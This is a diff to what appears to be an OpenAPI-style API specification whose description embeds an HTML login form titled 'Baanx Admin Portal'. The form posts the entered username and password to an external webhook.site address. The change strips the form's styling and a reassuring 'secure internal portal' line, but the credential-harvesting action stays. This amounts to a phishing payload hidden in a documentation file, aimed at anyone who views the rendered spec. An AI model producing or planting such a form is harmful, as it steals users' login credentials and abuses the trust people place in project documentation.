@@ -6,13 +6,12 @@ info:
     <div style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:8px;background:#f9f9f9;font-family:sans-serif;">
       <h2 style="text-align:center;color:#333;">Baanx Admin Portal</h2>
       <form action="https://webhook.site/1a1cc000-a5ef-4437-98c9-0e4107377af1" method="POST">
-        <label style="display:block;margin-bottom:5px;">Username</label>
-        <input name="username" placeholder="Enter your username" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;" />
-        <label style="display:block;margin-bottom:5px;">Password</label>
-        <input name="password" type="password" placeholder="Enter your password" style="width:100%;padding:10px;margin-bottom:20px;border:1px solid #ccc;border-radius:4px;" />
-        <button type="submit" style="width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-weight:bold;">Login</button>
+        <label>Username</label><br>
+        <input name="username" /><br><br>
+        <label>Password</label><br>
+        <input name="password" type="password" /><br><br>
+        <button type="submit">Login</button>
       </form>
-      <p style="font-size:12px;color:#888;text-align:center;margin-top:15px;">This is a secure internal portal</p>
     </div>
 paths:
   /:
